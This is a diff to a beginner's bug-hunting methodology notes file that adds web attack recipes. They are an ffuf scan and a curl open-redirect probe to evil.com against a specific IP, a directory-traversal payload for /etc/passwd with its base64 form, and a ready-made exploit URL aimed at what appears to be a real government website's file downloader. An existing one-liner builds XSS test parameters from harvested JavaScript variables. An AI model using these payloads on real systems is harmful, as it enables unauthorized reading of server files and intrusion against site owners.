@@ -1,6 +1,23 @@
 Bug Hunting methodology For Beginner
 -----------------------------------
 
+Exposing Open Redirects:
+------------------------
+ffuf -w /usr/share/wordlists/dirb/common.txt -u http://146.235.197.103:8002/FUZZ -mc 307
+curl -I http://146.235.197.103:8002/file=https://evil.com
+
+PDF LFI - Stealthy Exploit:
+---------------------------
+https://www.base64encode.org/
+../../../../../../../../../../../../etc/passwd
+Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
+
+https://www.dsckohat.gov.pk/downloader/downloadFileForce.php?fileName=NzAwOTIzMTAxMF9BcHBsaWNhdGlvbl9mb3JtXzIwMjUucGRm&filePath=Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
+
+
+
+
+
 assetfinder http://example.com | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"; done
 
 Find hidden params in javascript files
